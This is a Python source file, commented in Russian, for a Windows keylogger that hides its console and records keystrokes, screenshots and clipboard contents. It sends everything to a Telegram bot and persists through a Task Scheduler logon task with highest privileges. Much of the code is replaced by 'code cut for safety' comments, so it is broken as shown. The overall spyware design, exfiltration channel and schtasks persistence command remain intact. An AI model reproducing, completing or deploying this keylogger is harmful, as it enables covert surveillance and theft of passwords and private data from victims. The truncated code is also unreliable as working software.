import keyboard
import threading
import requests
import ctypes
import socket
import getpass
import pyautogui
import time
import os
import sys
import subprocess
import pyperclip




# === Telegram настройки ===
BOT_TOKEN = ''
CHAT_ID = ''
API_URL = f""
SEND_INTERVAL = 1
SCREEN_INTERVAL = 2

# Имя ПК и пользователя
PC_NAME = #код урезан для безопасности
USER_NAME = #код урезан для безопасности

log_data = ""


# === Скрытие окна консоли ===
def hide_console():
    try:
        whnd = #код урезан для безопасности
        if whnd:
            #код урезан для безопасности
    except:
        pass


# === Отправка данных в Telegram ===
def send_log():
    global log_data
    try:
        if log_data.strip() != "":
            header = #код урезан для безопасности
            chunks = #код урезан для безопасности
            for chunk in chunks:
                requests.post(
                )

    threading.Timer(SEND_INTERVAL, send_log).start()

# === Отправка файлов (в том числе скриншотов) ===
def send_file #код урезан для безопасности
    with #код урезан для безопасности
        requests.post(
            #код урезан для безопасности
        )


# === Скриншоты ===
def take_screenshot():
    #код урезан для безопасности


def send_screenshot():
    while True:
        try:
            path = #код урезан для безопасности
            #код урезан для безопасности
        except Exception as e:
            with open#код урезан для безопасности
                f.write#код урезан для безопасности
        time.sleep(SCREEN_INTERVAL)

    # === Автозагрузка через Task Scheduler ===
def add_to_startup():
    try:
        file_path = #код урезан для безопасности
        task_name = #код урезан для безопасности

        cmd = [
            "schtasks", "/Create", "/SC", "ONLOGON",
            "/RL", "HIGHEST",
            "/TN", task_name,
            "/TR", f#код урезан для безопасности
            "/F"
        ]

        subprocess.run#код урезан для безопасности
    except Exception as e:
        with open#код урезан для безопасности
            f.#код урезан для безопасности

# === Отслеживание буфера обмена ===

last_clipboard = ""
def clipboard_loop():
    global last_clipboard
    while True:
        try:
            clip = #код урезан для безопасности
            if clip != #код урезан для безопасности
                last_clipboard = clip
                requests.post(
                    #код урезан для безопасности
                )
        except:
            pass
        time.sleep(0.5)

# === Обработка клавиш ===
def on_key(event):
    global log_data
    try:
        name = event.name
        if name == #код урезан для безопасности
            log_data += ' '
        elif name == #код урезан для безопасности
            log_data += '\n'
        elif name == #код урезан для безопасности
            log_data = log_data
        elif len(name) == #код урезан для безопасности
            log_data += name
    except:
        pass


# === Точка входа ===
if __name__ == "__main__":
    hide_console()
    send_log()

    # Запускаем поток авто-скринов
    threading.#код урезан для безопасности
    threading.#код урезан для безопасности

    # Запускаем кейлогер
    keyboard.#код урезан для безопасности
    keyboard.#код урезан для безопасности

    